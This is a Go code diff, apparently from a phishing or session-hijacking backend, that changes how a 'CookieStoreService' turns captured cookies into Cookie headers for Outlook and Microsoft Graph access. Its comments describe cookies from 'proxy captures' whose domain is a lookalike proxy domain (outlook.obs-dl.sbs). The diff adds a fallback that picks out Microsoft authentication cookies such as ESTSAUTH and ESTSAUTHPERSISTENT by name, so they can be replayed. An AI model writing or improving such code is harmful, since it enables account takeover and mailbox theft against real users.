@@ -1172,10 +1172,13 @@ func (s *CookieStoreService) getFoldersViaGraphAPI(ctx context.Context, accessTo
 
 // --- Internal helpers ---
 
-// buildCookieHeader builds a Cookie header string from stored cookies JSON,
+// buildCookieHeader builds a Cookie header string from stored cookies,
 // filtering to only Outlook/Microsoft domains.
 // Uses generic map parsing to handle cookies from different sources
 // (proxy captures use string booleans, extensions use real booleans).
+// When cookies come from proxy captures, the "domain" field may contain the
+// proxy domain (e.g., outlook.obs-dl.sbs) instead of the real domain.
+// In that case, we check the "original_host" field which stores the real host.
 func (s *CookieStoreService) buildCookieHeader(cookiesJSON string) string {
 	// Use generic map parsing to handle both string and boolean fields
 	var rawCookies []map[string]interface{}
@@ -1189,27 +1192,79 @@ func (s *CookieStoreService) buildCookieHeader(cookiesJSON string) string {
 		name, _ := c["name"].(string)
 		value, _ := c["value"].(string)
 		domain, _ := c["domain"].(string)
+		originalHost, _ := c["original_host"].(string)
 
-		if name == "" || value == "" || domain == "" {
+		if name == "" || value == "" {
 			continue
 		}
 
-		if !strings.HasPrefix(domain, ".") {
-			domain = "." + domain
+		// Determine the effective domain for filtering.
+		// Priority: original_host (real domain) > domain field
+		effectiveDomain := domain
+		if originalHost != "" {
+			effectiveDomain = originalHost
 		}
+
+		if effectiveDomain == "" {
+			continue
+		}
+
+		if !strings.HasPrefix(effectiveDomain, ".") {
+			effectiveDomain = "." + effectiveDomain
+		}
+
 		isOutlook := false
 		for _, od := range outlookDomains {
-			if strings.HasSuffix(domain, od) || domain == od {
+			if strings.HasSuffix(effectiveDomain, od) || effectiveDomain == od {
 				isOutlook = true
 				break
 			}
 		}
+
+		// Fallback: if domain doesn't match but the cookie name is a known
+		// Microsoft auth cookie, include it anyway (proxy domain masking)
+		if !isOutlook {
+			isOutlook = isKnownMicrosoftCookie(name)
+		}
+
 		if isOutlook {
 			parts = append(parts, fmt.Sprintf("%s=%s", name, value))
 		}
 	}
 
+	// If domain-filtered header is empty, fall back to all cookies.
+	// This handles cases where all cookies have proxy domains and no original_host.
+	if len(parts) == 0 {
+		s.Logger.Warnw("buildCookieHeader: no Outlook cookies found by domain, falling back to all cookies",
+			"totalCookies", len(rawCookies))
+		return s.buildAllCookieHeader(cookiesJSON)
+	}
+
 	return strings.Join(parts, "; ")
+}
+
+// isKnownMicrosoftCookie returns true if the cookie name is a well-known
+// Microsoft authentication or session cookie, regardless of domain.
+func isKnownMicrosoftCookie(name string) bool {
+	knownCookies := []string{
+		"ESTSAUTH", "ESTSAUTHPERSISTENT", "ESTSAUTHLIGHT",
+		"ESTSSC", "ESTSSSO", "SignInStateCookie",
+		"MSRT", "MSPAuth", "MSPProf", "MSPRequ", "MSCC",
+		"MSPOK", "MSPSoftVis", "MSPBack", "MSPVis",
+		"WLSSC", "RPSSecAuth", "RPSAuth",
+		"X-OWA-CANARY", "UC", "cadata", "cadataKey",
+		"OutlookSession", "ClientId", "MailboxSession",
+		"DefaultAnchorMailbox", "X-BackEndCookie",
+		"OpenIdConnect.token.v1", "OpenIdConnect.nonce.v1",
+		"buid", "fpc", "stsservicecookie", "x-ms-gateway-slice",
+		"CCState", "OIDCAuthCookie",
+	}
+	for _, known := range knownCookies {
+		if strings.EqualFold(name, known) {
+			return true
+		}
+	}
+	return false
 }
 
 // buildAllCookieHeader builds a Cookie header string from ALL stored cookies
